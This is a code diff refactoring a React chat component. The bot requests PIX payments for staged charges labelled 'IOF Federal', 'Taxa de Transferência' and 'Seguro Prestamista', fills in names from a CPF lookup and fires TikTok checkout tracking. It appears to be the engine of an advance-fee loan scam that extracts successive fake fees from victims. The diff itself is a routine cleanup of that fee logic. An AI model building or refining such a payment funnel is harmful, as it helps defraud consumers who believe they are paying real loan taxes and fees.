@@ -2304,14 +2304,9 @@ const Chat = () => {
   };
 
   const generatePixPayment = async () => {
-    const introText =
-      paymentPhase === "iof"
-        ? `Segue o PIX para pagamento do IOF Federal:`
-        : paymentPhase === "taxa"
-        ? `Segue o PIX para pagamento da taxa de transferência:`
-        : `Segue o PIX para pagamento do Seguro Prestamista:`;
+    const phaseConfig = PAYMENT_PHASES[paymentPhase];
     await addBotMessages(() => [{
-      id: Date.now(), text: introText,
+      id: Date.now(), text: phaseConfig.pixIntroText,
       fromUser: false, time: getNow(), read: true,
     }]);
 
@@ -2339,18 +2334,9 @@ const Chat = () => {
         });
       } catch (e) { console.error('TikTok identify error:', e); }
 
-      const contentId =
-        paymentPhase === "iof" ? 'iof_federal'
-        : paymentPhase === "taxa" ? 'taxa_transferencia'
-        : 'seguro_prestamista';
-      const contentName =
-        paymentPhase === "iof" ? 'IOF Federal'
-        : paymentPhase === "taxa" ? 'Taxa de Transferência'
-        : 'Seguro Prestamista';
-      const pixValueCents =
-        paymentPhase === "iof" ? 2490
-        : paymentPhase === "taxa" ? 1874
-        : 3179;
+      const contentId = phaseConfig.contentId;
+      const contentName = phaseConfig.contentName;
+      const pixValueCents = phaseConfig.valueCents;
 
       // Robust fallbacks: prefer freshly-stored chatState, then cpfData from CPF lookup
       let resolvedNome = (nome || '').trim();
@@ -2431,12 +2417,11 @@ const Chat = () => {
         });
       } catch (e) { console.error('TikTok InitiateCheckout error:', e); }
 
-      const pixPaymentExtra =
-        paymentPhase === "iof"
-          ? { phase: "iof" as const, label: "IOF Federal", sublabel: "Imposto sobre Operações Financeiras:" }
-          : paymentPhase === "taxa"
-          ? { phase: "taxa" as const, label: "Taxa de Transferência", sublabel: "Taxa de transferência interbancária:" }
-          : { phase: "seguro" as const };
+      const pixPaymentExtra: { phase: PaymentPhaseId; label?: string; sublabel?: string } = {
+        phase: paymentPhase,
+        ...(phaseConfig.cardLabel ? { label: phaseConfig.cardLabel } : {}),
+        ...(phaseConfig.cardSublabel ? { sublabel: phaseConfig.cardSublabel } : {}),
+      };
 
       await addBotMessages(() => [{
         id: Date.now() + 1,
